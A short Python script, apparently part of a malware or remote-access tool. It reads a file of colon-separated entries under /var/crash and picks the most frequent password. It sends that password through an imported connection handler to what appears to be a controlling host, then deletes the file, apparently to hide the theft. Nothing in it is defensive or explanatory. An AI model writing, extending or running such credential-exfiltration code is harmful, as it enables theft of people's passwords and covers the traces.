import os
file_path= '/var/crash/EOF.txt'
if os.path.exists(file_path):
    p_list = {}
    file= open(file_path,'r')
    for line in file:
        line=line.split(':')
        pword=line[1].strip()
        if pword in p_list:
            p_list[pword] = int(p_list[pword]) + 1
        else: p_list[pword] = 1
from connection_handler import conn
if p_list != {}:
    max_key = max(p_list, key=p_list.get)
    exec_value='__exec_value__|__pword__/'+str(max_key)
    conn.send_data(exec_value)
    os.remove(file_path)